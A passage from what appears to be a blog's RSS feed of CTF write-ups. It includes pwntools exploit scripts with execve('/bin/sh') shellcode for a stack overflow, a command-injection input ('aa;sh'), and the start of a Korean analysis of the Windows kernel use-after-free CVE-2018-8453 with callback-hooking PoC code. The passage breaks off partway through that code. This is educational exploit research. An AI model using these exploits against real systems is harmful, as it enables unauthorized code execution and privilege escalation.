      <content:encoded><![CDATA[<center>2021 zer0pts CTF Write-up </center><h1 id="Not-Beginner’s-Stack-pwnable"><a href="#Not-Beginner’s-Stack-pwnable" class="headerlink" title="Not Beginner’s Stack (pwnable)"></a>Not Beginner’s Stack (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>Let’s check the protection of the binary.<br><img src="https://user-images.githubusercontent.com/49066484/110238894-62cf5700-7f87-11eb-9635-da4146f6c20e.png" alt="899"><br>You can find that all protection is turned off.</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">  call notvuln</span><br><span class="line">  call exit</span><br><span class="line"></span><br><span class="line">notvuln:</span><br><span class="line">;; char buf[0x100];</span><br><span class="line">  enter 0x100, 0</span><br><span class="line">;; vuln();</span><br><span class="line">  call vuln</span><br><span class="line">;; write(1, &quot;Data: &quot;, 6);</span><br><span class="line">  mov edx, 6</span><br><span class="line">  mov esi, msg_data</span><br><span class="line">  xor edi, edi</span><br><span class="line">  inc edi</span><br><span class="line">  call write</span><br><span class="line">;; read(0, buf, 0x100);</span><br><span class="line">  mov edx, 0x100</span><br><span class="line">  lea rsi, [rbp-0x100]</span><br><span class="line">  xor edi, edi</span><br><span class="line">  call read</span><br><span class="line">;; return 0;</span><br><span class="line">  xor eax, eax</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">vuln:</span><br><span class="line">;; char buf[0x100];</span><br><span class="line">  enter 0x100, 0</span><br><span class="line">;; write(1, &quot;Data: &quot;, 6);</span><br><span class="line">  mov edx, 6</span><br><span class="line">  mov esi, msg_data</span><br><span class="line">  xor edi, edi</span><br><span class="line">  inc edi</span><br><span class="line">  call write</span><br><span class="line">;; read(0, buf, 0x1000);</span><br><span class="line">  mov edx, 0x1000               ; [!] vulnerability</span><br><span class="line">  lea rsi, [rbp-0x100]</span><br><span class="line">  xor edi, edi</span><br><span class="line">  call read</span><br><span class="line">;; return;</span><br><span class="line">  leave</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><p>They gave me source code. So it is easy to find where vulnerability is. Look at the <code>vuln</code> function. when <code>read</code> function is called, a vulnerability occurs. The buffer size is only 0x100. but the size that you can read is 0x1000. It is Buffer Overflow. Then i can overwrite the return address because the stack canary is turned off. and also i can use shellcode. (NX disabled). we can control the rsi by overwritting rbp-0x100. [<code>lea rsi, [rbp-0x100]</code>]. It means that i can arbitrary write.<br>So i changed retrun address to <code>call exit</code>  into the address to call <code>start</code> for triggering bof again. I got many opportunities to trigger bof. I wrote shellcode on the section of <code>0x00600000</code><br><img src="https://user-images.githubusercontent.com/49066484/110239479-687a6c00-7f8a-11eb-8844-89e946b56211.png" alt="bbn"><br>It was <code>rwxp</code> Permission, That’s why i used shellcode and wrote in there. Finally I overwrited return address to shellcode address and got the sh.</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.ctf.zer0pts.com&#x27;,9011)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line"><span class="comment">#change rsi (ret addr)</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600334</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite ret addr.</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x4000c3</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#change rsi for shellcode and write.</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600384</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#change rsi (ret addr)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;C&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600334</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#overwrite ret addr.</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x600284</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Write-up/">Write-up</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/CTF/">CTF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://pwnkidhn.github.io/tags/write-up/">write-up</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/03/06/2021-03-07-zer0pts_CTF_2021/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2020 X-mas CTF </title>
      <link>https://pwnkidhn.github.io/2020/12/24/2020-12-25-XMAS_CTF_2020/</link>
      <guid>https://pwnkidhn.github.io/2020/12/24/2020-12-25-XMAS_CTF_2020/</guid>
      <pubDate>Thu, 24 Dec 2020 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;2020 X-mas CTF Write-up &lt;/center&gt;


&lt;h1 id=&quot;Baby-Rudolph-pwnable&quot;&gt;&lt;a href=&quot;#Baby-Rudolph-pwnable&quot; class=&quot;headerlink&quot; title=&quot;Baby_Rudolph (pwnable)&quot;&gt;&lt;/a&gt;Baby_Rudolph (pwnable)&lt;/h1&gt;&lt;h2 id=&quot;vulnerability&quot;&gt;&lt;a href=&quot;#vulnerability&quot; class=&quot;headerlink&quot; title=&quot;vulnerability&quot;&gt;&lt;/a&gt;vulnerability&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/110240519-b180ef00-7f8f-11eb-96e2-089f6ad9c54f.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;There is Buffer Overflow in &lt;code&gt;vuln function&lt;/code&gt;. It is triggered by calling &lt;code&gt;read&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/110240604-189ea380-7f90-11eb-9a28-53016a34540e.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;And Using &lt;code&gt;get_arm&lt;/code&gt; function, we can get the sh. So it is easy bof. just overwrite retur address to &lt;code&gt;get_arm&lt;/code&gt;.&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>2020 X-mas CTF Write-up </center><h1 id="Baby-Rudolph-pwnable"><a href="#Baby-Rudolph-pwnable" class="headerlink" title="Baby_Rudolph (pwnable)"></a>Baby_Rudolph (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/110240519-b180ef00-7f8f-11eb-96e2-089f6ad9c54f.png" alt="image"></p><p>There is Buffer Overflow in <code>vuln function</code>. It is triggered by calling <code>read</code>.</p><p><img src="https://user-images.githubusercontent.com/49066484/110240604-189ea380-7f90-11eb-9a28-53016a34540e.png" alt="image"></p><p>And Using <code>get_arm</code> function, we can get the sh. So it is easy bof. just overwrite retur address to <code>get_arm</code>.</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/49066484/110240678-6f0be200-7f90-11eb-9e34-da677cef49ef.png" alt="image"></p><p>We need ARM, because the binary  is for ARM architecture. So They gave docker. but it didn’t work. I used qemu for constructing  analysis environment.<br><code>/usr/bin/qemu-system-aarch64 -M virt -cpu cortex-a57 -m 128 -kernel ./kernel -initrd ./rootfs -nographic -serial mon:stdio -append console=ttyAMA0</code></p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;host7.dreamhack.games&#x27;</span>,<span class="number">17341</span>)</span><br><span class="line">get_arm = <span class="number">0x400680</span></span><br><span class="line">argv = <span class="number">0x1225</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">72</span></span><br><span class="line">payload += p64(get_arm)</span><br><span class="line">payload += p64(argv)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ARM...!\N&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Oil-System-pwnable"><a href="#Oil-System-pwnable" class="headerlink" title="Oil_System (pwnable)"></a>Oil_System (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>It opens the file with the name I entered. and also it uses <code>System</code> function when it opens the file.<br>(ex Syste(/home/~~))</p><p><img src="https://user-images.githubusercontent.com/49066484/110240852-36b8d380-7f91-11eb-8288-3655ddfe0783.png" alt="image"></p><p>When i entered the name, It called <code>check_upper_lower</code>function. But it only check whether the first character is lowercase or not. It means the name can contain <code>;</code> or <code>|</code> after first character. So we can use <code>command injection</code>.  if i  enter the name as A;/bin/sh, can get the sh.</p><h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./oil&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name : &#x27;</span> , <span class="string">&#x27;aa;sh&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Code : &#x27;</span>, <span class="string">&#x27;1 2 3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Write-up/">Write-up</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/CTF/">CTF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://pwnkidhn.github.io/tags/write-up/">write-up</category>
      
      
      <comments>https://pwnkidhn.github.io/2020/12/24/2020-12-25-XMAS_CTF_2020/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CVE-2018-8453</title>
      <link>https://pwnkidhn.github.io/2020/12/02/2020-12-03-CVE-2018-8453/</link>
      <guid>https://pwnkidhn.github.io/2020/12/02/2020-12-03-CVE-2018-8453/</guid>
      <pubDate>Wed, 02 Dec 2020 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;CVE-2018-8453 // Windows Kernel 1-day&lt;/center&gt; 


&lt;h1 id=&quot;Root-Cause&quot;&gt;&lt;a href=&quot;#Root-Cause&quot; class=&quot;headerlink&quot; title=&quot;Root Cause&quot;&gt;&lt;/a&gt;Root Cause&lt;/h1&gt;&lt;p&gt;NtUserSetWindowFNID()는 FNID를 설정할 때,  Window가 release 됐는지 아닌지 확인하지 않음.&lt;/p&gt;
&lt;p&gt;→ 따라서 이미 free된 Window에 FNID를 설정하여 재사용 할 수 있음.&lt;/p&gt;
&lt;p&gt;이 취약점을 이용하여, xxSBTrackInit()에서 pSBTrack의 UAF를 발생시킬 수 있음.&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>CVE-2018-8453 // Windows Kernel 1-day</center> <h1 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h1><p>NtUserSetWindowFNID()는 FNID를 설정할 때,  Window가 release 됐는지 아닌지 확인하지 않음.</p><p>→ 따라서 이미 free된 Window에 FNID를 설정하여 재사용 할 수 있음.</p><p>이 취약점을 이용하여, xxSBTrackInit()에서 pSBTrack의 UAF를 발생시킬 수 있음.</p><span id="more"></span><h1 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h1><p><img src="https://user-images.githubusercontent.com/75205011/100963586-01ec4900-356a-11eb-830e-b11ce5f2afc3.png" alt="sdafasdf"></p><ul><li>먼저 KernelCallbackTable에 있는 2개의 callback을 Hook함. (fnDWORD, fnClientFree…)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span>.<span class="keyword">asm</span></span><br><span class="line">GetKernelCallbackTableBase PROC</span><br><span class="line">;<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">mov rax,gs:[<span class="number">60</span>h]</span><br><span class="line">lea rax,[rax+<span class="number">58</span>h]</span><br><span class="line">mov rax,[rax]</span><br><span class="line">ret</span><br><span class="line">GetKernelCallbackTableBase ENDP</span><br><span class="line"></span><br><span class="line">Main.<span class="function">c</span></span><br><span class="line"><span class="function"><span class="title">VirtualProtect</span><span class="params">(CallbackTb, <span class="number">512</span>, PAGE_READWRITE, &amp;OldProtect)</span></span>; <span class="comment">//메모리 보호 설정 값 변경</span></span><br><span class="line">CallbackTb += <span class="number">2</span>;   <span class="comment">//Table에서의 Hook할 Callback의 위치.</span></span><br><span class="line">fnDWORD = (fct_fnDispatch64)*CallbackTb;  <span class="comment">//Hook함수 설정.</span></span><br><span class="line">*CallbackTb = (ULONG64)fnDWORDCallBack;  </span><br><span class="line"></span><br><span class="line">CallbackTb += <span class="number">124</span>;</span><br><span class="line">fnClientFreeWindowClassExtraBytes = (fct_fnDispatch64)*CallbackTb;</span><br><span class="line">*CallbackTb = (ULONG64)fnClientFreeWindowClassExtraBytesCallBack; </span><br></pre></td></tr></table></figure><ul><li>Main Window와 ScrollBar 를 만듬.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Structure 설정.</span></span><br><span class="line">WNDCLASSEXW wcex;</span><br><span class="line">wcex.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">wcex.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">wcex.lpfnWndProc = DefWindowProc;</span><br><span class="line">wcex.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wcex.cbWndExtra = <span class="number">4</span>;</span><br><span class="line">wcex.hInstance = <span class="number">0</span>;</span><br><span class="line">wcex.hIcon = LoadIcon(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">wcex.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">1</span>);</span><br><span class="line">wcex.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wcex.lpszClassName = <span class="string">L&quot;WNDCLASSMAIN&quot;</span>;</span><br><span class="line">wcex.hIconSm = LoadIcon(wcex.hInstance, <span class="literal">NULL</span>);</span><br><span class="line">RegisterClassExW(&amp;wcex);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Main Window 생성.</span></span><br><span class="line">hMainWND = CreateWindowW(<span class="string">L&quot;WNDCLASSMAIN&quot;</span>, <span class="string">L&quot;CVE&quot;</span>, WS_DISABLED, <span class="number">2</span>, <span class="number">2</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//ScrollBar 생성.</span></span><br><span class="line">hSBWND = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, WS_CHILD | WS_VISIBLE | SBS_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">20</span>, hMainWND, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><ul><li><p>SendMessage()함수를 사용해 ScrollBar에 WM_LBUTTONDOWN 메시지를 보냄</p><p>  (이는 xxxSBTrackInit()함수 호출을 Trigger하기 위함)</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SendMessage(hSBWND, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0x00020002</span>);</span><br></pre></td></tr></table></figure><ul><li><p>xxxSBTrackLoop이 호출되어, 마우스 왼쪽 버튼이 해제되거나 다른 메시지가 수신될 때까지 루프에서 마우스 이벤트를 캡쳐함.</p></li><li><p>xxxSBTrackLoop이 실행되므로 fnDWORD가 Callback됨. (이때 미리 Hook한 fnDWORD가 실행됨)</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnDWORDCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (bMSGSENT &amp;&amp; *msg) &#123;</span><br><span class="line">bMSGSENT = FALSE;</span><br><span class="line">DestroyWindow(hMainWND); <span class="comment">//DestroyWindow함수를 이용해 Main Window를 파괴.</span></span><br><span class="line"><span class="comment">//DestroyWindow 함수는 xxxFreeWindow함수를 호출.</span></span><br><span class="line"><span class="comment">//xxxFreeWindow 함수는 먼저 Main Window의 FNID를 8000(free)으로 변경 함.</span></span><br><span class="line"><span class="comment">//그리고 xxxClientFreeWindowClassExtraBytes를 호출.</span></span><br><span class="line">&#125;</span><br><span class="line">fnDWORD(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>xxxClientFreeWindowClass..함수는 Callback를 호출 (이때 미리 Hook한 fnClinet…가 실행됨)</li></ul><p><img src="https://user-images.githubusercontent.com/75205011/100963641-247e6200-356a-11eb-8256-ac9c185b666c.png" alt="asd"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnClientFreeWindowClassExtraBytesCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (*(PULONG64)*((PULONG64)*(msg - <span class="number">11</span>)) == (ULONG64)hMainWND) &#123;</span><br><span class="line"></span><br><span class="line">hSBWNDnew = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, SWP_HIDEWINDOW | SB_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">SetWindowFNID(hMainWND, <span class="number">0x2A1</span>); <span class="comment">//이미Free된 Main Window의 FNID(0x2A1 ~ 0x2AAA)를 설정함.</span></span><br><span class="line">SetCapture(hSBWNDnew); <span class="comment">//새로운 Window를 만들고, 이를 현재 thread에서 Capture하고 있는 window로 설정.</span></span><br><span class="line">f3 = TRUE;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">fnClientFreeWindowClassExtraBytes(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Main Window가 파괴됐기 때문에 xxxSBTrackLoop이 돌아와 HMAssignmentUnLock(&amp;pSBTrack-&gt;spwndNotify)을 계속 실행하여 Main Window를 완전히 해제하는 관련 역참조를 수행하는데, 이로 인해 xxxFreeWindow가 다시 호출됨.</li></ul><p><img src="https://user-images.githubusercontent.com/75205011/100963660-306a2400-356a-11eb-8ecc-e28614b76662.png" alt="cdsf"></p><ul><li>Main Window의 FNID는 (xxxFreeWindow에서 8000(Free)되었다가,  fnClient..함수에서 82A1로 설정 되었음.) 따라서 SfnDWORD함수가 호출되며 이는 아까 hook했던 fnDWORD가 다시 호출됨.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnDWORDCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (bMSGSENT &amp;&amp; *msg) &#123;</span><br><span class="line">bMSGSENT = FALSE;</span><br><span class="line">DestroyWindow(hMainWND); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*msg &amp;&amp; (*(msg + <span class="number">1</span>) == <span class="number">0x70</span>) &amp;&amp; (*((PULONG64)(*msg)) == (ULONG64)hMainWND)) &#123;</span><br><span class="line">SendMessage(hSBWNDnew, WM_CANCELMODE, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//여기서 WM_CANCELMODE를 사용하여,</span></span><br><span class="line"><span class="comment">//pSBTrack을 free함.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fnDWORD(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>POC 프로그램은 단일 스레드이기 때문에 스레드에 의해 생성된 모든 창은 동일한 스레드 정보 구조를 가리킨다. SBTrack이 속해 있는 Scrollbar 창이 해제되었더라도, 동일한 스레드에 의해 새 창이 생성되는 한, pSBTrack은 여전히 동일한 창을 가리키고 있다.</li><li>setCaputure(hSBWNDNew)를 호출하여 hSBTWNDNDNew 창에서 마우스 이벤트를 캡처하기 위해 현재 스레드를 설정했다. 마지막으로, UserFreePool(pSBTrack)이 pSBTrack을 릴리스하기 위해 실행되어 HMAssignmentUnLock(&amp;pSBTrack-&gt;spwnd를 실행하기 전에 pSBTrack을 해제함SB) 및 결과 pSBTrack에 After Free.</li><li>Usermode에서 pSBTrack을 Free했다.</li><li>정상적인 흐름은  xxxSBTrackLoop가 끝난 후  xxxSBTrackInit()에서 Free 시켜야 하지만, 미리 UserMode에서 Free 해버렸으므로, 이후에 pSBTrack에 대한 UAF가 발생함.</li></ul><h1 id="Windbg-analyze"><a href="#Windbg-analyze" class="headerlink" title="Windbg !analyze"></a>Windbg !analyze</h1><p><img src="https://user-images.githubusercontent.com/75205011/100963679-3eb84000-356a-11eb-9045-821cd77c38ec.png" alt="asdf"></p><p><img src="https://user-images.githubusercontent.com/75205011/100963690-47107b00-356a-11eb-95b0-3e89d376161a.png" alt="xv"></p><h1 id="POC-code"><a href="#POC-code" class="headerlink" title="POC code."></a>POC code.</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 